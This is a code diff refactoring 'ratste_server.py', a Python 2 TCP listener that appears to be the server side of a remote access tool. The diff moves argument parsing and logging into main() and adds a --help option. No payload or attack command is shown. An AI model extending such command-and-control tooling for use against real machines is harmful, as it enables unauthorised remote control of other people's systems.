@@ -30,30 +30,43 @@ import logging
 import time
 import datetime
 
-try:
-    LHOST = str(sys.argv[1])
-    LPORT = int(sys.argv[2])
-except:
-    print 'ratste > usage: ./ratste_server.py <local_ip> <local_port>'
-    print 'ratste > using default host (127.0.0.1) and port (7261)' 
-    LHOST = '127.0.0.1'
-    LPORT = 7261
-
 def encode(plain_message):
-
     plain_message_bytes = plain_message.encode('ascii')
     base64_message_bytes = base64.b64encode(plain_message_bytes)
     base64_message = base64_message_bytes.decode('ascii')
     return base64_message
 
 def decode(base64_message):
-
     base64_message_bytes = base64_message.encode('ascii')
     plain_message_bytes = base64.b64decode(base64_message_bytes)
     plain_message = plain_message_bytes.decode('ascii')
     return plain_message
 
-def main():
+def main(): 
+    try:
+        log_file = ('logs/ratste-{}_UTC.log'.
+            format(datetime.datetime.utcnow()).replace(" ", "_"))
+        logging.Formatter.converter = time.gmtime
+        logging.basicConfig(format='%(asctime)s.%(msecs)03d_UTC %(message)s', 
+            datefmt="%Y-%m-%d_%H:%M:%S", filename=log_file, level=logging.DEBUG)
+    except:
+        # connection to client lost
+        print ('ratste > cannot initialize logging, exiting...')
+        sys.exit(0) 
+    
+    
+    if (len(sys.argv) > 1) and (str(sys.argv[1]) == '--help'):
+        print 'ratste > usage: ./ratste_server.py <local_ip> <local_port>'
+        sys.exit(0)
+    else:
+        try: 
+            LHOST = str(sys.argv[1])
+            LPORT = int(sys.argv[2])
+        except:
+            print 'ratste > usage: ./ratste_server.py <local_ip> <local_port>'
+            print 'ratste > using default host (127.0.0.1) and port (7261)' 
+            LHOST = '127.0.0.1'
+            LPORT = 7261
     
     try:
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -62,13 +75,7 @@ def main():
         tcp_socket.listen(10)
     except:
         print 'ratste > network error, exiting...'
-        sys.exit(1)
-
-    log_file = ('logs/ratste-{}_UTC.log'.
-        format(datetime.datetime.utcnow()).replace(" ", "_"))
-    logging.Formatter.converter = time.gmtime
-    logging.basicConfig(format='%(asctime)s.%(msecs)03d_UTC %(message)s', 
-        datefmt="%Y-%m-%d_%H:%M:%S", filename=log_file, level=logging.DEBUG)
+        sys.exit(0)
 
     print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
     logging.debug('ratste > server listening on {}:{}'.format(LHOST, LPORT))
